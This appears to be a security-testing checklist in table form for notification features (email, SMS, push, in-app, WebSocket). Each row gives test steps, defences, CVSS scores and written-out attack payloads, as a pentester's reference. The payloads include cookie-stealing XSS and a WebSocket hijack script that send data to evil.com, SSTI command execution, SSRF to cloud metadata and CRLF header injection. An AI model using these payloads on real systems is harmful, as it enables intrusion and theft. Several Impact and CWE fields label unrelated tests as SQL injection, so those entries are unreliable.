# 10. Communication & Notification — Checklist

Feature-area security **test cases** for “10. Communication & Notification” — functionality-driven, impact-first with severity + CVSS.

*196 test cases · spreadsheet grid — scroll sideways for all 12 columns.*

| Operation | Test Case Name | Test Category | Where to Test / Injection Point | Test Steps | Expected Result | Payload Example | Impact | Severity | CVSS | Tools | References |
|---|---|---|---|---|---|---|---|---|---|---|---|
| COMM-001 | Email Header Injection via Notification Fields | Injection (WSTG-INPV-11) | Email Notifications | 1. Trigger an email notification where user-controlled input is included in headers.<br>2. Inject CRLF characters followed by additional email headers like Cc or Bcc.<br>3. Submit and check if injected headers are processed.<br>4. Monitor if emails are sent to injected recipients. | Application must sanitize all user input used in email headers and strip CRLF characters to prevent header injection. | <code>email=user@test.com%0d%0aCc:attacker@evil.com%0d%0aBcc:spy@evil.com;name=Test%0d%0aContent-Type:text/html</code> | CRLF/response-splitting -&gt; header injection, cache poisoning, session fixation. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Custom Scripts;SMTP Tester | CWE-113; [Host Header kit](#/checklist/hostheader); OWASP CRLF Injection; PortSwigger |
| COMM-002 | Stored XSS in Email Notification Body | Cross-Site Scripting (WSTG-INPV-02) | Email Notifications | 1. Enter XSS payload in fields that appear in email notifications such as username or order notes or feedback.<br>2. Trigger the email notification.<br>3. Open the email in a web-based email client.<br>4. Check if the script executes in the email context. | Application must sanitize and encode all dynamic content inserted into email bodies before sending to prevent XSS in webmail clients. | <code>username=&lt;script&gt;fetch('https://evil.com/?c='+document.cookie)&lt;/script&gt;;order_notes=&lt;img src=x onerror=alert(1)&gt;</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;XSS Hunter;Email Client | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
| COMM-003 | Email Spoofing via From Header Manipulation | Injection (WSTG-INPV-11) | Email Notifications | 1. Intercept an email notification trigger request.<br>2. Check if the From or Reply-To header can be influenced by user input.<br>3. Modify the sender address.<br>4. Verify if the email is sent with the spoofed sender. | Application must hardcode the From address server-side and never accept client-provided sender information. SPF/DKIM/DMARC records must be configured. | <code>Inject from_email=admin@target.com or reply_to=attacker@evil.com in notification trigger request</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;SMTP Tester;MXToolbox | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| COMM-004 | Email Bombing via Notification Trigger Abuse | Business Logic (WSTG-BUSL-05) | Email Notifications | 1. Identify notification triggers like password reset or order confirmation.<br>2. Script automated requests to trigger hundreds of email notifications to a single address.<br>3. Check for rate limiting.<br>4. Verify if the target inbox is flooded. | Application must implement rate limiting on all email notification triggers to prevent email bombing attacks against users. | <code>Send 500+ POST /api/notifications/send-email requests targeting same email address in rapid succession</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite Intruder;Custom Scripts;JMeter | CWE-840; PortSwigger Business logic |
| COMM-005 | Sensitive Data Exposure in Email Content | Information Disclosure (WSTG-INFO-05) | Email Notifications | 1. Trigger various email notifications.<br>2. Inspect email content for sensitive data like passwords or full credit card numbers or internal IDs.<br>3. Check if emails are sent over TLS.<br>4. Verify email content encryption. | Emails must not contain plain-text passwords or full payment details and must be transmitted over TLS with appropriate masking of sensitive data. | <code>Inspect notification emails for plain_text_password;full_card_number;internal_user_id;api_key;session_token</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Email Client;Wireshark;Burp Suite | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| COMM-006 | SSTI in Email Template Rendering | Injection (WSTG-INPV-18) | Email Notifications | 1. Enter template syntax in fields rendered in email templates such as name or address.<br>2. Trigger the email notification.<br>3. Check if the template engine processes the injected expression.<br>4. Look for computed values or server information in the email. | Application must escape all template syntax in user-provided data before inserting into email templates to prevent server-side template injection. | <code>name={{7&#42;7}};address=${7&#42;7};feedback=&lt;%= system('id') %&gt;;comment={{config.__class__.__init__.__globals__['os'].popen('id').read()}}</code> | Server-side template injection -&gt; remote code execution on the app server. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Tplmap;Email Client | CWE-1336; [SSTI kit](#/checklist/ssti); PortSwigger SSTI (James Kettle) |
| COMM-007 | HTML Injection in Email Body | Injection (WSTG-INPV-03) | Email Notifications | 1. Enter HTML tags in fields that appear in notification emails.<br>2. Include phishing links or fake forms in the HTML.<br>3. Trigger the email.<br>4. Check if HTML renders in the email client. | Application must sanitize HTML in user-provided content before including in email bodies or use plain-text emails for user-generated content. | <code>name=&lt;h1&gt;URGENT: Account Compromised&lt;/h1&gt;&lt;a href='https://evil.com/phishing'&gt;Reset Password Now&lt;/a&gt;&lt;form action='https://evil.com/steal'&gt;&lt;input name='password'&gt;&lt;button&gt;Submit&lt;/button&gt;&lt;/form&gt;</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Email Client | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| COMM-008 | Email Notification IDOR | Broken Access Control (WSTG-AUTHZ-04) | Email Notifications | 1. Trigger an email notification for own account.<br>2. Intercept the request and change user_id or email parameter to another user.<br>3. Submit and check if notification is sent to or about the other user.<br>4. Verify information leakage. | Application must validate that the authenticated user can only trigger notifications for their own account and must not accept client-specified recipient overrides. | <code>Change POST /api/notifications/email with user_id=1001 to user_id=1002 or email=victim@test.com</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| COMM-009 | Open Redirect via Email Links | Open Redirect (WSTG-CLNT-04) | Email Notifications | 1. Trigger an email notification containing links.<br>2. Check if any link parameters allow URL manipulation.<br>3. Modify the redirect URL to an external malicious site.<br>4. Click the link and verify redirection. | Application must validate all URLs in email notifications against a whitelist and prevent redirects to external or untrusted domains. | <code>Email link: https://target.com/redirect?url=https://evil.com/phishing or https://target.com/click?next=//evil.com</code> | Open redirect -&gt; OAuth code/token theft, credible phishing on the trusted origin. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;Browser | CWE-601; [Open Redirect kit](#/checklist/openredir); PortSwigger; PayloadsAllTheThings |
| COMM-010 | Email Attachment Malware Injection | File Upload (WSTG-INPV-12) | Email Notifications | 1. If email notifications include user-uploaded attachments check file type validation.<br>2. Upload a malicious file as an attachment.<br>3. Trigger the email.<br>4. Check if the malicious attachment is delivered. | Application must scan all email attachments for malware and validate file types before including in notification emails. | <code>Upload shell.exe renamed to report.pdf.exe or macro-enabled document.docm as attachment</code> | Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;ClamAV;VirusTotal | CWE-434; [File Upload kit](#/checklist/fileupload); PortSwigger File upload; ImageTragick |
| COMM-011 | Unsubscribe Link IDOR | Broken Access Control (WSTG-AUTHZ-04) | Email Notifications | 1. Receive an email notification with an unsubscribe link.<br>2. Modify the user identifier in the unsubscribe URL.<br>3. Visit the modified URL.<br>4. Check if another user is unsubscribed from notifications. | Application must use cryptographically signed or tokenized unsubscribe links that cannot be manipulated to affect other users. | <code>Change /unsubscribe?user_id=1001&amp;token=abc to user_id=1002&amp;token=abc or /unsubscribe?email=victim@test.com</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Browser | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| COMM-012 | Email Notification Timing Side-Channel | Information Disclosure (WSTG-INFO-01) | Email Notifications | 1. Trigger email notifications for existing and non-existing accounts.<br>2. Measure response times precisely.<br>3. Check if timing differences reveal whether an account exists. | Application must ensure consistent response times for notification triggers regardless of whether the target account exists to prevent enumeration. | <code>Compare response time for POST /api/notify?email=existing@test.com vs email=nonexistent@test.com</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Custom Scripts | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| COMM-013 | SMS Injection via Phone Number Field | Injection (WSTG-INPV-01) | SMS Notifications | 1. Update notification phone number.<br>2. Inject additional phone numbers or SMS content using delimiters.<br>3. Submit and check if SMS is sent to injected numbers.<br>4. Test with various separator characters. | Application must validate phone numbers strictly against international format patterns and reject any input containing separators or additional data. | <code>phone=+1234567890;+0987654321;phone=+1234567890%0d%0aSend money to attacker;phone=+1234567890\nNew message content</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| COMM-014 | SMS Flooding via Notification Abuse | Business Logic (WSTG-BUSL-05) | SMS Notifications | 1. Identify SMS notification triggers like OTP or order updates.<br>2. Script rapid automated requests to send hundreds of SMS messages to a target number.<br>3. Check for rate limiting.<br>4. Calculate potential cost abuse. | Application must implement strict rate limiting on SMS notifications per phone number and per user with cooldown periods between requests. | <code>Send 200+ POST /api/notifications/sms requests to same phone number within 5 minutes</code> | Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite Intruder;Custom Scripts | CWE-799; [Account Takeover kit](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger |
| COMM-015 | SMS Content Manipulation | Business Logic (WSTG-BUSL-01) | SMS Notifications | 1. Intercept the SMS notification trigger request.<br>2. Check if SMS content or template_id can be modified.<br>3. Change the message content to send phishing or misleading messages.<br>4. Submit and verify. | Application must generate SMS content server-side from predefined templates and never accept client-provided message content. | <code>Change sms_body=Your order is confirmed to sms_body=Account suspended. Call +1-ATTACKER-NUM immediately;modify template_id</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| COMM-016 | Phone Number Enumeration via SMS Notifications | Information Disclosure (WSTG-INFO-04) | SMS Notifications | 1. Trigger SMS notifications with various phone numbers.<br>2. Check response differences for valid vs invalid registered numbers.<br>3. Look for confirmation messages that reveal registration status. | Application must return identical responses for SMS notifications regardless of whether the phone number is registered to prevent enumeration. | <code>POST /api/sms/send with various phone numbers and compare responses for registered vs unregistered numbers</code> | Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Custom Scripts | CWE-204; [Account Takeover kit](#/checklist/ato); OWASP WSTG-IDNT-04 |
| COMM-017 | International SMS Premium Rate Abuse | Business Logic (WSTG-BUSL-01) | SMS Notifications | 1. Trigger SMS notification.<br>2. Change the recipient phone number to a premium rate number controlled by the attacker.<br>3. Submit repeatedly.<br>4. Check if the application sends SMS to premium numbers generating revenue for attacker. | Application must validate phone numbers against a blacklist of premium rate numbers and implement cost controls on SMS sending. | <code>Change phone to premium rate numbers like +44871xxxxxxx or international premium numbers</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| COMM-018 | SMS OTP Bypass via Response Manipulation | Authentication (WSTG-ATHN-01) | SMS Notifications | 1. Request SMS OTP.<br>2. Intercept the API response.<br>3. Check if OTP is leaked in the response body or headers.<br>4. Modify response status to bypass OTP verification. | Application must never include OTP values in API responses and must validate OTP server-side without trusting client-side verification. | <code>Check response for otp_code;verification_code;token fields;change {"verified":false} to {"verified":true}</code> | Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-640; [Account Takeover kit](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups |
| COMM-019 | SSRF via SMS Gateway Configuration | SSRF (WSTG-INPV-19) | SMS Notifications | 1. If the application allows configuring SMS gateway URLs or webhook endpoints intercept the request.<br>2. Set the URL to an internal service.<br>3. Check for SSRF. | Application must hardcode SMS gateway endpoints server-side and not allow client-side configuration of gateway URLs. | <code>gateway_url=http://169.254.169.254/latest/meta-data/;callback_url=http://localhost:6379/</code> | SSRF -&gt; internal-service reach / cloud metadata credential theft. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Collaborator | CWE-918; [SSRF kit](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger |
| COMM-020 | SMS Template Injection | Injection (WSTG-INPV-18) | SMS Notifications | 1. Enter template syntax in fields included in SMS messages.<br>2. Trigger the SMS notification.<br>3. Check if the template engine processes the injected syntax in the SMS content. | Application must escape template expressions in user data before inserting into SMS templates. | <code>name={{7&#42;7}};order_id=${Runtime.getRuntime().exec('id')};comment=#{7&#42;7}</code> | Server-side template injection -&gt; remote code execution on the app server. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Tplmap | CWE-1336; [SSTI kit](#/checklist/ssti); PortSwigger SSTI (James Kettle) |
| COMM-021 | Push Notification Token Theft | Information Disclosure (WSTG-INFO-05) | Push Notifications | 1. Inspect client-side storage for push notification tokens.<br>2. Check if the device token is exposed in API responses or logs.<br>3. Attempt to use a stolen token to send notifications to another user's device. | Application must protect push notification tokens and not expose them in client-accessible responses or logs. | <code>Check localStorage;sessionStorage;API responses for device_token;fcm_token;apns_token values</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Browser DevTools;Burp Suite | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| COMM-022 | Push Notification Spoofing via Token Manipulation | Broken Access Control (WSTG-AUTHZ-04) | Push Notifications | 1. Register for push notifications and capture the device token.<br>2. Intercept the registration request and replace with another user's device token.<br>3. Check if notifications meant for the attacker are sent to the victim's device. | Application must bind push tokens to authenticated user sessions and validate ownership before sending any notifications. | <code>Replace device_token in POST /api/push/register with another user's captured device_token</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| COMM-023 | XSS in Push Notification Content | Cross-Site Scripting (WSTG-INPV-02) | Push Notifications | 1. If push notification content is derived from user input inject XSS payload in the relevant fields.<br>2. Trigger the push notification.<br>3. Check if payload executes when the notification is rendered in the browser or app. | Application must sanitize all dynamic content in push notifications before rendering in any client context. | <code>Set order_name=&lt;img src=x onerror=alert(document.cookie)&gt; and trigger push notification containing this field</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;XSS Hunter | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
| COMM-024 | Unauthorized Push Notification Sending | Broken Access Control (WSTG-AUTHZ-02) | Push Notifications | 1. As a regular user attempt to access the push notification sending endpoint.<br>2. Try to send notifications to other users or broadcast to all users.<br>3. Check if role-based access control is enforced. | Application must restrict push notification sending capabilities to authorized administrator roles only. | <code>POST /api/push/send with target=all_users and message=Phishing content using regular user credentials</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| COMM-025 | Push Notification Denial of Service | Business Logic (WSTG-BUSL-05) | Push Notifications | 1. Trigger rapid push notification sends to a single device.<br>2. Send hundreds of notifications in quick succession.<br>3. Check for rate limiting.<br>4. Monitor device impact. | Application must implement rate limiting on push notifications per device and per user to prevent notification flooding. | <code>Send 1000+ POST /api/push/send requests targeting same device_token in rapid succession</code> | Denial of service -&gt; availability impact for this feature / the app. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite Intruder;Custom Scripts | CWE-400; [Race Condition kit](#/checklist/racecondition); OWASP; PortSwigger |
| COMM-026 | Push Notification Content Injection via Deep Links | Injection (WSTG-INPV-01) | Push Notifications | 1. If push notifications contain deep links or action URLs check if the URL can be manipulated.<br>2. Inject malicious deep link URLs.<br>3. Check if users are redirected to malicious content when tapping the notification. | Application must validate all deep link URLs in push notifications against a whitelist of allowed schemes and domains. | <code>action_url=javascript:alert(1);deep_link=https://evil.com/phishing;action=intent://evil.com#Intent;end</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| COMM-027 | Sensitive Data in Push Notification Payload | Information Disclosure (WSTG-INFO-05) | Push Notifications | 1. Trigger various push notifications.<br>2. Intercept the notification payloads.<br>3. Check for sensitive data like full order details or personal information visible on lock screen. | Push notifications must not contain sensitive data and must be configured to hide content on lock screens until device is unlocked. | <code>Check notification payload for full_address;payment_details;account_balance;personal_messages visible on lock screen</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Mobile Proxy;Frida | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| COMM-028 | Push Token Registration Without Authentication | Authentication (WSTG-ATHN-01) | Push Notifications | 1. Attempt to register a push notification token without authentication.<br>2. Remove authorization headers.<br>3. Check if unauthenticated token registration is allowed. | Application must require valid authentication before allowing push notification token registration. | <code>POST /api/push/register with device_token=TOKEN123 without Authorization header</code> | Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-640; [Account Takeover kit](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups |
| COMM-029 | IDOR on In-App Notification Access | Broken Access Control (WSTG-AUTHZ-04) | In-App Notifications | 1. Fetch in-app notifications for own account.<br>2. Intercept the request and change user_id to another user.<br>3. Check if another user's notifications are returned.<br>4. Look for sensitive information in notifications. | Application must validate that the authenticated user can only access their own in-app notifications. | <code>Change GET /api/notifications?user_id=1001 to user_id=1002;change GET /api/notifications/NOTIF-1001 to NOTIF-1002</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| COMM-030 | Stored XSS via In-App Notification Content | Cross-Site Scripting (WSTG-INPV-02) | In-App Notifications | 1. Trigger actions that generate in-app notifications with user-controlled content.<br>2. Inject XSS payload in the content fields.<br>3. View the notification center.<br>4. Check if the script executes. | Application must sanitize and encode all notification content before rendering in the notification center UI. | <code>Create order with name=&lt;script&gt;alert(document.cookie)&lt;/script&gt; and check if notification displays with XSS execution</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;XSS Hunter | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
| COMM-031 | Notification Injection by Unauthorized User | Broken Access Control (WSTG-AUTHZ-02) | In-App Notifications | 1. Attempt to create or inject in-app notifications for other users via API.<br>2. Send crafted requests to the notification creation endpoint.<br>3. Check if notifications appear in other users' notification centers. | Application must restrict notification creation to authorized system processes and admin roles and prevent user-to-user notification injection. | <code>POST /api/notifications/create with target_user_id=1002 and message=Phishing content using regular user credentials</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| COMM-032 | In-App Notification Data Leakage | Information Disclosure (WSTG-INFO-05) | In-App Notifications | 1. Fetch notifications via API.<br>2. Inspect the full response for excessive data.<br>3. Check for internal system information or other users' data in notification payloads. | Application must return only necessary notification fields and strip any internal metadata or cross-user data from responses. | <code>Check notification response for internal_id;admin_notes;other_user_data;system_config;debug_info</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| COMM-033 | Notification Count Manipulation | Business Logic (WSTG-BUSL-01) | In-App Notifications | 1. Check the unread notification count endpoint.<br>2. Intercept and modify the count value.<br>3. Check if the manipulated count affects application behavior or creates confusion. | Application must calculate notification counts server-side and not trust client-provided count values. | <code>Intercept response and change {"unread_count":2} to {"unread_count":9999} and check UI impact</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Low | 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite | CWE-840; PortSwigger Business logic |
| COMM-034 | Mass Notification Deletion Without Authorization | Broken Access Control (WSTG-AUTHZ-04) | In-App Notifications | 1. Attempt to delete all notifications via a bulk delete endpoint.<br>2. Include notification IDs belonging to other users.<br>3. Check if cross-user deletion is possible. | Application must validate ownership of every notification before allowing deletion. | <code>POST /api/notifications/bulk-delete with notification_ids containing other users' notification IDs</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| COMM-035 | Clickjacking on Notification Actions | Clickjacking (WSTG-CLNT-09) | In-App Notifications | 1. Create a page that iframes the notification center.<br>2. Overlay invisible buttons over notification action buttons like accept or approve.<br>3. Lure victim to click.<br>4. Check if framing is allowed. | Application must implement X-Frame-Options DENY and CSP frame-ancestors none on notification pages with action buttons. | <code>&lt;iframe src='https://target.com/notifications' style='opacity:0'&gt;&lt;/iframe&gt; with overlay buttons on Accept/Approve actions</code> | Clickjacking of a sensitive action -&gt; UI-redress-driven state change. | Medium | 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N) | Burp Suite;Browser | CWE-1021; [CSRF kit](#/checklist/csrf); OWASP Clickjacking; PortSwigger |
| COMM-036 | WebSocket Authentication Bypass | Authentication (WSTG-ATHN-01) | Real-time Updates (WebSocket) | 1. Capture the WebSocket connection upgrade request.<br>2. Remove authentication tokens or cookies.<br>3. Establish WebSocket connection without authentication.<br>4. Check if real-time updates are received without valid credentials. | Application must authenticate WebSocket connections during the handshake and reject unauthenticated upgrade requests. | <code>Connect to ws://target.com/ws/notifications without session cookie or token;try wss:// without auth headers</code> | Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;wscat;OWASP ZAP | CWE-640; [Account Takeover kit](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups |
| COMM-037 | WebSocket IDOR on Channel Subscription | Broken Access Control (WSTG-AUTHZ-04) | Real-time Updates (WebSocket) | 1. Connect to WebSocket and subscribe to own notification channel.<br>2. Change the channel_id or user_id in the subscription message to another user.<br>3. Check if updates meant for other users are received. | Application must validate that the authenticated user can only subscribe to their own channels and reject cross-user subscriptions. | <code>Send {"subscribe":"user_channel_1002"} or {"channel":"notifications_1002"} while authenticated as user 1001</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;wscat;Custom Scripts | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| COMM-038 | WebSocket Message Injection | Injection (WSTG-INPV-01) | Real-time Updates (WebSocket) | 1. Connect to WebSocket.<br>2. Send crafted messages with injection payloads.<br>3. Check if injected messages are broadcast to other users or processed by the server.<br>4. Test for command injection in message handlers. | Application must validate and sanitize all incoming WebSocket messages and enforce authorization before processing or broadcasting. | <code>Send {"type":"broadcast",message:"&lt;script&gt;alert(1)&lt;/script&gt;"} or {"type":"admin_command",cmd:"restart"}</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;wscat;Custom Scripts | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| COMM-039 | WebSocket Cross-Site WebSocket Hijacking (CSWSH) | CSRF (WSTG-SESS-05) | Real-time Updates (WebSocket) | 1. Create a malicious page that establishes a WebSocket connection to the target using the victim's cookies.<br>2. Lure the victim to visit the malicious page.<br>3. Check if the WebSocket connection is established with the victim's session.<br>4. Monitor for data received. | Application must validate the Origin header during WebSocket handshake and implement CSRF protection for WebSocket connections. | <code>&lt;script&gt;var ws=new WebSocket('wss://target.com/ws/notifications');ws.onmessage=function(e){fetch('https://evil.com/steal?data='+e.data)}&lt;/script&gt;</code> | CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO. | Critical | 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N) | Custom HTML;Browser;Burp Suite | CWE-352; [CSRF kit](#/checklist/csrf); PortSwigger CSRF + SameSite |
| COMM-040 | WebSocket Denial of Service via Message Flooding | Business Logic (WSTG-BUSL-05) | Real-time Updates (WebSocket) | 1. Establish a WebSocket connection.<br>2. Send thousands of messages in rapid succession.<br>3. Send extremely large messages.<br>4. Open many concurrent WebSocket connections.<br>5. Monitor server performance. | Application must implement message rate limiting and maximum message size and connection limits per user on WebSocket endpoints. | <code>Send 10000 messages per second via ws;send single message of 100MB;open 1000 concurrent WebSocket connections</code> | Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | wscat;Custom Scripts;JMeter | CWE-799; [Account Takeover kit](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger |
| COMM-041 | WebSocket Protocol Downgrade Attack | Security Misconfiguration (WSTG-CONF-01) | Real-time Updates (WebSocket) | 1. Attempt to connect via ws:// instead of wss://.<br>2. Check if the server accepts unencrypted WebSocket connections.<br>3. Sniff the traffic for sensitive data. | Application must enforce wss:// (WebSocket Secure) connections and reject plain ws:// connections in production environments. | <code>Connect to ws://target.com/ws/notifications instead of wss:// and check if connection is accepted</code> | Security misconfiguration -&gt; weakened control exploitable via the mapped attack. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | wscat;Wireshark;Burp Suite | CWE-16; OWASP Security Misconfiguration (A05) |
